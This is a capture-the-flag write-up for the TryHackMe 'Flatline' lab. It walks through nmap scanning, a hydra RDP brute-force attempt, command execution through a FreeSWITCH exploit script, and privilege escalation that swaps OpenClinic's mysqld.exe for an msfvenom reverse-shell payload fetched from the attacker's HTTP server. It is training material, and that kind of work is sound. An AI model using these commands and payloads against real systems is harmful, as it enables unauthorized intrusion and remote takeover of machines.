## Flatline

Room link: https://tryhackme.com/room/flatline

# Scanning
I ran an full nmap scan with ping disabled after it didnt allow me to run a scan. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -p- -Pn [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-11 07:54 EST
Nmap scan report for [Remote IP]
Host is up (0.10s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
8021/tcp open  ftp-proxy

Nmap done: 1 IP address (1 host up) scanned in 253.58 seconds
```
I ran more aggressive scans on each of the ports from the full nmap scan. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A -p 3389 -Pn [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-11 07:59 EST
Nmap scan report for [Remote IP]
Host is up (0.10s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-03-11T12:59:24+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
|_ssl-date: 2022-03-11T12:59:26+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A -Pn -p 8021 [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-11 07:59 EST
Nmap scan report for [Remote IP]
Host is up (0.098s latency).

PORT     STATE SERVICE          VERSION
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
```
I started up hydra to brute force a log in with RDP. 
```
hydra -L /home/ajread/resources/wordlists/SecLists/Usernames/Names/names.txt -P /home/ajread/resources/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt [Remote IP]rdp
```
# Enumeration 
However, it didnt work so I decided to go after the more interesting FreeSwitch service. I found a possible exploitiation with command execution (https://www.exploit-db.com/exploits/47799). I was able to connect to the service with the below command. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```
# Initial Access
I had to do some digging around. But, I eventually found the location of the ```user.txt```. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "type C:\Users\Nekrotic\Desktop\user.txt"
Authenticated
Content-Type: api/response
Content-Length: 38

[REDACTED]
```
# Privilege Escalation 
Within the desktop directory of the user, there was a root.txt. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir C:\Users\Nekrotic\Desktop"
Authenticated
Content-Type: api/response
Content-Length: 374

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,561,933,312 bytes free
```
I tried to access it but it came up with the following output. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "type C:\Users\Nekrotic\Desktop\root.txt"
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```
I navigated to the Administrator home directory and found some interesting output. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir C:\Users\Administrator\Desktop"
Authenticated
Content-Type: api/response
Content-Length: 449

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Administrator\Desktop

09/11/2021  07:18    <DIR>          .
09/11/2021  07:18    <DIR>          ..
08/11/2021  18:24       108,048,384 FreeSWITCH-1.10.1-Release-x64.msi
08/11/2021  06:05       413,584,335 OpenClinicSetup5.194.18_32bit_full_fr_en_pt_es_nl.exe
               2 File(s)    521,632,719 bytes
               2 Dir(s)  50,513,035,264 bytes free
```
There is a local privilege escalation exploit for that version of OpenClinic (https://www.exploit-db.com/exploits/50448). I confirmed the existence and location of the vulnerable ```mysqld.exe```. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir c:\projects\openclinic\mariadb\bin\mysqld.exe"
Authenticated
Content-Type: api/response
Content-Length: 263

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of c:\projects\openclinic\mariadb\bin

22/03/2021  23:47            26,600 mysqld.exe
               1 File(s)         26,600 bytes
               0 Dir(s)  50,526,441,472 bytes free
```
Following the local priv esc exploit, I created the payloard with msfvenom. 
```
ajread@aj-ubuntu:~/apps/metasploit-framework$ ./msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP] LPORT=9999 -f exe > /home/ajread/TryHackMe/practice/mysqld_evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
I set up a netcat listener on my local machine. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
Listening on 0.0.0.0 9999
```
I also served up an http server using python. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ sudo python -m http.server 80
[sudo] password for ajread: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
I saw it grab the shell from my server. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ sudo python -m http.server 80
[sudo] password for ajread: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
[Remote IP] - - [14/Mar/2022 19:30:13] "GET /mysqld_evil.exe HTTP/1.1" 200 -
```
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "rename C:\projects\openclinic\mariadb\bin\mysqld_evil.exe mysqld.exe"
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```
Then, I restarted the machine. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "shutdown /r"
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```
And got admin access after a short reboot. 
```
C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
[REDACTED]
```